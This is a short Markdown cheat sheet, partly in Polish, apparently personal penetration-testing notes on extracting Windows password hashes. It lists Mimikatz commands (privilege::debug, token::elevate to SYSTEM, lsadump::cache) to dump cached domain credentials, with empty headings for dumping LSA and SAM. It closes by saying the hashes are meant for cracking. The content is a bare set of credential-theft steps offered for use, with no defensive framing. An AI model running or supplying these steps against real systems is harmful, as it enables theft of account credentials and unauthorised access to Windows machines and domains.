## Get windows hashes
### Mimikatz
1. Uruchom Mimikatz jako admin
2. Podnieś uprawnienia: ``privilege::debug``
3. Podnosimy ponownie. Cache wymaga uprawnień NT\Authority: ``token::elevate``  
``Token Id  : 0``  
``User name :``  
``SID name  : NT AUTHORITY\SYSTEM``
4. Pobieramy hashe: ``lsadump::cache``
### Dump LSA (task manager)
### Get SAM




### Co zrobić z hashem?
Cracking.  
Not for pass the hash.
